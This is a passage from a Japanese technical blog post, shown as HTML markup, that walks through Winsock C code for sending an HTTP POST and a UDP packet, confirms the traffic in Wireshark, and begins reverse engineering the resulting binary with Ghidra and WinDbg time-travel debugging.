&lt;p&gt;画像引用元：&lt;a href=&quot;https://www.tutorialspoint.com/unix_sockets/client_server_model.htm&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Unix Socket - Client Server Model&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;httpリクエストの送信&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#http%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%81%AE%E9%80%81%E4%BF%A1&quot; aria-label=&quot;httpリクエストの送信 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;HTTPリクエストの送信&lt;/h3&gt;
&lt;p&gt;事前に作成したPOSTリクエストのデータを&lt;code class=&quot;language-text&quot;&gt;send&lt;/code&gt;関数でサーバに送信します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// HTTPリクエストの送信&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Sending HTTP request...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; postdata&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;postdata&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;今回は実装していませんが、レスポンスを受信するには&lt;code class=&quot;language-text&quot;&gt;recv&lt;/code&gt;関数を使います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/winsock/sending-and-receiving-data-on-the-client&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Sending and Receiving Data on the Client - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;udp通信を行う関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#udp%E9%80%9A%E4%BF%A1%E3%82%92%E8%A1%8C%E3%81%86%E9%96%A2%E6%95%B0&quot; aria-label=&quot;udp通信を行う関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;UDP通信を行う関数&lt;/h3&gt;
&lt;p&gt;UDP通信を行う関数は以下の通りです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;send_udp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;senddata&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; destination&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; RSERVER&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;short&lt;/span&gt; port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; httphost&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; LSERVER&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; dstSocket&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; toSendText&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;MAXBUF&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; read_size&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// WSADATAの初期化&lt;/span&gt;
    WSADATA wsaData&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;WSAStartup&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;MAKEWORD&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;wsaData&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;sockaddr_in&lt;/span&gt; dstAddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_family &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; AF_INET&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_addr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;s_addr &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;destination&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Socket通信の開始(SOCK_DGRAMを指定)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Creating socket...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    dstSocket &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;AF_INET&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; SOCK_DGRAM&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Creating socket failed!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Creating socket succeeded!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// UDPパケットの送信&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Sending UDP...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;sendto&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; senddata&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;senddata&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;SOCKADDR &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;UDP is sent!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;closesocket&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;WSACleanup&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;基本的にはTCP接続の時と同じ実装なので詳細は割愛します。&lt;/p&gt;
&lt;p&gt;違いとしては、UDP接続なのでSocketを作成する際の指定を&lt;code class=&quot;language-text&quot;&gt;SOCK_DGRAM&lt;/code&gt;にする点と、3wayハンドシェイクを行わないので&lt;code class=&quot;language-text&quot;&gt;connect&lt;/code&gt;関数を使用せず、&lt;code class=&quot;language-text&quot;&gt;sendto&lt;/code&gt;関数でデータ転送を行う点です。&lt;/p&gt;
&lt;h2 id=&quot;通信の確認&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E9%80%9A%E4%BF%A1%E3%81%AE%E7%A2%BA%E8%AA%8D&quot; aria-label=&quot;通信の確認 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;通信の確認&lt;/h2&gt;
&lt;p&gt;このプログラムを実行し、実際に通信が行われているかWireSharkで確認してみました。&lt;/p&gt;
&lt;p&gt;まず、以下の通りPOSTリクエストが送信されていることが確認できました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 540px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/64768d2f9690187105b1c5461918aaac/07484/image-70.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 64.16666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAABsklEQVQ4y51S207CQBTsrxmNJhpFQfBG/AtffPDfjBiFAlIoKJdaBLZAgdJWCpTYjrsbCHjBJjaZnLPb2dk5Z49wdX2D7f0wdg7C2NoLYXM3hFDsAsdnlwgdn3FETuI4ip0jchrHYfQcYfqfge0dRikncooDio3tPQjS4yOUnIRq9gmVbBbllIhaLgdCCIim0ahBo7E1X7N8ERc54zAwjtDMS7CLRZgUPVHEUMpjTEn//QRNecWo0YDTacO1THjTCXzvA77vw/O8b/DXYMkRpHQFhVQd5TyBXDRQU2yUK0PYtvvjdnZJEISkqCIpDpCXh3h4aEMUu7hPaHh+NtBqvePtzUajYXMnq6JrS85kVNzeEiSTbdzdEaTTOs076PXGnLAoa1XoT0G13qFOHBjGFJblYjCYwDRduO7HrweWYr+LCrLcpGXq0PUx+v0xd2YYE77udp35/oSXb1nTwLKFQqFJS9ShKCZeXgwORbFQrZqo0Mep1UzeRyY4m3nBgnKRIJHooFQa8INMgJARzxlU1aItmH4R+3MO6/UudWLCcWaBQ7sqttahRYd50eTV11yHIJef8U/CCQzXhkMAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/64768d2f9690187105b1c5461918aaac/8ac56/image-70.webp 240w,
/static/64768d2f9690187105b1c5461918aaac/d3be9/image-70.webp 480w,
/static/64768d2f9690187105b1c5461918aaac/9e625/image-70.webp 540w&quot;
              sizes=&quot;(max-width: 540px) 100vw, 540px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/64768d2f9690187105b1c5461918aaac/8ff5a/image-70.png 240w,
/static/64768d2f9690187105b1c5461918aaac/e85cb/image-70.png 480w,
/static/64768d2f9690187105b1c5461918aaac/07484/image-70.png 540w&quot;
            sizes=&quot;(max-width: 540px) 100vw, 540px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/64768d2f9690187105b1c5461918aaac/07484/image-70.png&quot;
            alt=&quot;image-70.png&quot;
            title=&quot;image-70.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;また、UDPパケットも受信していることを確認しました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 714px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/816c1ea998498b98edaeb6ba60edab0f/d67ca/image-71.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABG0lEQVQoz52NTUsCYRSF5/8ELSK0WkQQQaswnD50wjbt+xnRKgqinCmbnNEkLSKIMgjaqCV9QYsoBRdtxqWrhHdmnt6JkmgR6IGHe+65cK5iXlawrx9IXlQxziuYxTLH5WdO7+vkSi+kr6ro8pYq3lAoPcm8xtljnZO7Goe3rx3y1bcvlI38EWu5PKv7BZZX1hlPLDEUjdE/qdI3oTIaS0g/RyiiMaYtMjKzwHA0LqdGWM7ByDyh6ThhNc7A1CwKv/TeaGDu7JLc3MLQDVLSZzNZMpaNnbYktvSZDgd29ju3MFN76NtJFOG6CCFwPR/HaSJaLfA8epXi+z4BgRzH4aPdJtiCJ8EztwuEcP8UNpu0ZWGgn7xb/i3sRZ9q5+QYMReR+QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/816c1ea998498b98edaeb6ba60edab0f/8ac56/image-71.webp 240w,
/static/816c1ea998498b98edaeb6ba60edab0f/d3be9/image-71.webp 480w,
/static/816c1ea998498b98edaeb6ba60edab0f/80c40/image-71.webp 714w&quot;
              sizes=&quot;(max-width: 714px) 100vw, 714px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/816c1ea998498b98edaeb6ba60edab0f/8ff5a/image-71.png 240w,
/static/816c1ea998498b98edaeb6ba60edab0f/e85cb/image-71.png 480w,
/static/816c1ea998498b98edaeb6ba60edab0f/d67ca/image-71.png 714w&quot;
            sizes=&quot;(max-width: 714px) 100vw, 714px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/816c1ea998498b98edaeb6ba60edab0f/d67ca/image-71.png&quot;
            alt=&quot;image-71.png&quot;
            title=&quot;image-71.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでプログラムがちゃんと動作していることが確認できたので、最後にリバーシングしてみたいと思います。&lt;/p&gt;
&lt;h2 id=&quot;リバーシングする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B7%E3%83%B3%E3%82%B0%E3%81%99%E3%82%8B&quot; aria-label=&quot;リバーシングする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;リバーシングする&lt;/h2&gt;
&lt;h3 id=&quot;ghidraでデコンパイルする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ghidra%E3%81%A7%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;ghidraでデコンパイルする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Ghidraでデコンパイルする&lt;/h3&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;entry&lt;/code&gt;関数から&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数を特定しました。&lt;/p&gt;
&lt;p&gt;その後、&lt;code class=&quot;language-text&quot;&gt;send_http_post&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;send_udp&lt;/code&gt;関数を特定した後、&lt;code class=&quot;language-text&quot;&gt;win_tcp_udp.exe&lt;/code&gt;を実行したときに展開されたイメージベースを設定しました。&lt;/p&gt;
&lt;h3 id=&quot;windbgでttdトレースを取得する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%A7ttd%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;windbgでttdトレースを取得する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgでTTDトレースを取得する&lt;/h3&gt;
&lt;p&gt;解析を容易にするため、ビルドしたプログラムのTTDトレースを取得しました。&lt;/p&gt;
&lt;p&gt;TTDトレースの取得方法は以下の記事にまとめてあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-008-time-travel-debugging&quot;&gt;【WinDbg Preview】Time Travel Debuggingで始める新しいデバッグ手法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;また、取得したトレースファイルは以下のリポジトリにも置いてあります。&lt;/p&gt;
